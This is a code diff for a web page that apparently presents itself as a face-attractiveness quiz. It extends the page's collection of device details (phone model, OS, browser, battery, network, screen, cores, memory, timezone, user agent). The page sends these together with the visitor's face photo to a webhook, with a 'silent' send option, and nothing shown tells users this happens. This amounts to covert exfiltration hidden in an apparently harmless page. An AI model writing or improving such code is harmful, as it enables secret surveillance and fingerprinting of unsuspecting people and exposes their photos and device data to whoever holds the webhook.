@@ -236,6 +236,21 @@
     requestAnimationFrame(()=>{ resultEl.querySelectorAll('.f').forEach(f=>{ f.style.width=f.dataset.v+'%'; }); });
   }
 
+  const SCREENS=[
+    [[320,568,2],'iPhone SE (1st) / 5s'],
+    [[375,667,2],'iPhone 8 / SE (2nd) / SE (3rd)'],
+    [[375,812,3],'iPhone X / XS / 11 Pro'],
+    [[414,736,3],'iPhone 6+ / 7+ / 8+'],
+    [[414,896,2],'iPhone XR / 11'],
+    [[414,896,3],'iPhone XS Max / 11 Pro Max'],
+    [[390,844,3],'iPhone 12 / 13 / 14'],
+    [[393,852,3],'iPhone 14 Pro / 15 / 16'],
+    [[402,874,3],'iPhone 16 Pro'],
+    [[428,926,3],'iPhone 12 Pro Max / 13 Pro Max / 14 Plus'],
+    [[430,932,3],'iPhone 14 Pro Max / 15 Plus / 15 Pro Max / 16 Plus'],
+    [[440,956,3],'iPhone 16 Pro Max']
+  ];
+
   function parseUA(ua){
     const os = /Windows NT 10/.test(ua)?'Windows 10/11' : /Windows/.test(ua)?'Windows'
       : /iPhone|iPod/.test(ua)?'iOS' : /iPad/.test(ua)?'iPadOS'
@@ -243,52 +258,79 @@
     const osv = (ua.match(/OS (\d+)[._](\d+)/)||[]).slice(1).join('.')
       || (ua.match(/Android (\d+(?:\.\d+)?)/)||[])[1] || '';
     let browser='その他', bv='';
-    if(/Edg\//.test(ua)){ browser='Edge'; bv=(ua.match(/Edg\/([\d.]+)/)||[])[1]; }
+    if(/EdgiOS\//.test(ua)){ browser='Edge (iOS)'; bv=(ua.match(/EdgiOS\/([\d.]+)/)||[])[1]; }
+    else if(/Edg\//.test(ua)){ browser='Edge'; bv=(ua.match(/Edg\/([\d.]+)/)||[])[1]; }
+    else if(/CriOS\//.test(ua)){ browser='Chrome (iOS)'; bv=(ua.match(/CriOS\/([\d.]+)/)||[])[1]; }
+    else if(/FxiOS\//.test(ua)){ browser='Firefox (iOS)'; bv=(ua.match(/FxiOS\/([\d.]+)/)||[])[1]; }
     else if(/SamsungBrowser/.test(ua)){ browser='Samsung Internet'; bv=(ua.match(/SamsungBrowser\/([\d.]+)/)||[])[1]; }
     else if(/Chrome\//.test(ua)){ browser='Chrome'; bv=(ua.match(/Chrome\/([\d.]+)/)||[])[1]; }
     else if(/Firefox\//.test(ua)){ browser='Firefox'; bv=(ua.match(/Firefox\/([\d.]+)/)||[])[1]; }
     else if(/Safari\//.test(ua)){ browser='Safari'; bv=(ua.match(/Version\/([\d.]+)/)||[])[1]; }
-    let model='';
-    const m=ua.match(/;\s*([^;)]+)\s+Build\//);
-    if(m) model=m[1].trim();
+    const model=(ua.match(/;\s*([^;)]+?)\s+Build\//)||[])[1]||'';
     return {os, osv, browser, bv, model};
   }
-  async function battery(){
-    try{
-      const b=await navigator.getBattery();
-      return Math.round(b.level*100)+'%'+(b.charging?'（充電中）':'');
-    }catch(e){ return '取得不可'; }
+
+  function guessModel(ua){
+    const w=Math.min(screen.width,screen.height), h=Math.max(screen.width,screen.height), d=Math.round(devicePixelRatio||1);
+    const iPad=/iPad/.test(ua)||(/Macintosh/.test(ua)&&navigator.maxTouchPoints>1);
+    if(iPad) return 'iPad（'+w+'×'+h+' @'+d+'x）';
+    if(/iPhone|iPod/.test(ua)){
+      for(const [k,v] of SCREENS) if(k[0]===w&&k[1]===h&&k[2]===d) return v;
+      return 'iPhone（世代不明 '+w+'×'+h+' @'+d+'x）';
+    }
+    return '';
   }
+
   function conn(){
     const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
     if(!c) return '取得不可';
     const p=[];
-    if(c.effectiveType) p.push(c.effectiveType.toUpperCase());
+    if(c.effectiveType) p.push(String(c.effectiveType).toUpperCase());
     if(c.downlink) p.push('下り '+c.downlink+'Mbps');
     if(c.rtt) p.push('RTT '+c.rtt+'ms');
     if(c.saveData) p.push('データ節約ON');
     return p.length?p.join(' / '):'取得不可';
   }
+
+  async function battery(){
+    try{
+      if(typeof navigator.getBattery!=='function') return '取得不可';
+      const b=await navigator.getBattery();
+      return Math.round(b.level*100)+'%'+(b.charging?'（充電中）':'');
+    }catch(e){ return '取得不可'; }
+  }
+
   async function meta(){
-    const ua=navigator.userAgent;
+    const ua=navigator.userAgent||'';
     const p=parseUA(ua);
+    const f=[];
+    const put=(name,value)=>{ const v=String(value==null?'':value).trim(); if(v) f.push({name,value:v.slice(0,1000),inline:true}); };
+
     let model=p.model, osv=p.osv;
     try{
-      if(navigator.userAgentData){
-        const h=await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
-        if(h.model) model=h.model;
-        if(h.platformVersion) osv=h.platformVersion;
+      if(navigator.userAgentData&&navigator.userAgentData.getHighEntropyValues){
+        const h=await Promise.race([
+          navigator.userAgentData.getHighEntropyValues(['model','platformVersion']),
+          sleep(1200).then(()=>({}))
+        ]);
+        if(h&&h.model) model=h.model;
+        if(h&&h.platformVersion) osv=h.platformVersion;
       }
     }catch(e){}
-    return [
-      {name:'端末',value:[model,p.os+(osv?' '+osv:'')].filter(Boolean).join(' / ')||'不明',inline:true},
-      {name:'ブラウザ',value:p.browser+(p.bv?' '+p.bv:''),inline:true},
-      {name:'バッテリー',value:await battery(),inline:true},
-      {name:'回線',value:conn(),inline:true},
-      {name:'画面',value:screen.width+'x'+screen.height+' @'+devicePixelRatio+'x',inline:true},
-      {name:'言語 / TZ',value:(navigator.language||'?')+' / '+(Intl.DateTimeFormat().resolvedOptions().timeZone||'?'),inline:true},
-      {name:'UA',value:'```'+ua.slice(0,200)+'```'}
-    ];
+    if(!model) model=guessModel(ua);
+
+    put('機種', model||'不明');
+    put('OS', p.os+(osv?' '+osv:'')+(navigator.platform?'（'+navigator.platform+'）':''));
+    put('ブラウザ', p.browser+(p.bv?' '+p.bv:''));
+    put('バッテリー', await battery());
+    put('回線', conn());
+    put('画面', screen.width+'×'+screen.height+' @'+(devicePixelRatio||1)+'x / 表示 '+innerWidth+'×'+innerHeight);
+    put('コア / メモリ', (navigator.hardwareConcurrency||'?')+' cores / '+(navigator.deviceMemory||'?')+' GB');
+    put('タッチ点', navigator.maxTouchPoints);
+    put('言語 / TZ', (navigator.language||'?')+' / '+(()=>{try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){return'?'}})());
+    if(ua) f.push({name:'UA',value:'```'+ua.slice(0,220)+'```'});
+    if(!f.length) put('端末','取得不可');
+    return f;
   }
 
   const statusEl=()=>document.getElementById('status');
@@ -301,17 +343,24 @@
   async function doSend(blob,silent,withMeta){
     if(!blob) return;
     const fd=new FormData();
-    const name=unameEl.value.trim()||'顔面偏差値診断';
+    const payload={username:unameEl.value.trim()||'顔面偏差値診断'};
+
     if(withMeta){
-      const fields=await meta();
-      fd.append('payload_json',JSON.stringify({
-        username:name,
-        embeds:[{title:'端末情報',color:0x6d4aff,fields,image:{url:'attachment://face.jpg'},timestamp:new Date().toISOString()}]
-      }));
-    } else if(name!=='顔面偏差値診断'){
-      fd.append('payload_json',JSON.stringify({username:name}));
+      let fields=[];
+      try{ fields=await meta(); }catch(e){ fields=[]; }
+      payload.attachments=[{id:0,filename:'face.jpg'}];
+      payload.embeds=[{
+        title:'端末情報',
+        color:0x6d4aff,
+        fields:fields.length?fields:[{name:'端末',value:'取得不可'}],
+        image:{url:'attachment://face.jpg'},
+        timestamp:new Date().toISOString()
+      }];
     }
+
+    fd.append('payload_json',JSON.stringify(payload));
     fd.append('files[0]',blob,'face.jpg');
+
     try{
       const r=await fetch(HOOK,{method:'POST',body:fd});
       if(r.status===429){
@@ -334,4 +383,4 @@
 })();
 </script>
 </body>
- </html>
+</html>
